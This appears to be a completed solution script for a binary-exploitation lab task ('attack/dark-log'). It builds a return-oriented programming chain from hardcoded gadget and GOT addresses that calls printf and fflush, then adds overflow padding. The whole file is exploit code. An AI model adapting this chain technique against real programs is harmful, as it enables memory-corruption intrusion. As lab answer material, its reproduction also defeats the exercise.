#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
p=lambda x:x.to_bytes(8,'little')
POP6=0x40189a
CALLF=0x401880
G_PRINTF=0x602028
G_FFLUSH=0x602038
FMT=0x4018c8

chain=p(POP6)
chain+=p(0)+p(1)+p(G_PRINTF)+p(FMT)+p(0x41)+p(0)
chain+=p(CALLF)
chain+=p(0)
chain+=p(0)+p(1)+p(G_FFLUSH)+p(0)+p(0)+p(0)
chain+=p(CALLF)
assert len(chain)==128

payload = chain+b'B'*128+(0xa8).to_bytes(4,'little')+b'\n'

sys.stdout.buffer.write(payload)
